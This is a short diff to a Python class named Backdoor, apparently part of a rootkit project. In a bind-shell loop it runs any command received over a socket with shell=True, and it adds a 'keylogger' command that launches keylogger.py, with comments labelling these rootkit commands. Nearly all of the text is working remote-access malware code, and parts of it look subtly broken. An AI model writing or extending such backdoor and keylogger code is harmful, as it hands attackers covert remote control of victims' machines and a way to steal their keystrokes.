@@ -39,8 +39,7 @@ class Backdoor:
 
 	def bind_shell(self, host=None, port=None):
 
-		if host is None:
-			return 0
+		assert type(host) == str
 
 		if port is None:
 			port = int(44134)
@@ -80,9 +79,16 @@ class Backdoor:
 			cmd = ""
 			while True:
 				cmd = sock.recv(1024).encode("UTF-8")
-				if cmd.strip("\n") == "exit":
+				cmd = cmd.strip("\n")
+				#Rootkit specific commands
+				if cmd  == "exit":
 					sock.close()
-				proc = subprocess.Popen(cmd, 
+				if cmd == "keylogger":
+					os.system("python keylogger.py")
+					continue
+				#Shell commands
+				else: 
+					proc = subprocess.Popen(cmd, 
 					stdout=subprocess.PIPE, 
 					stderr=subprocess.PIPE, 
 					shell=True)
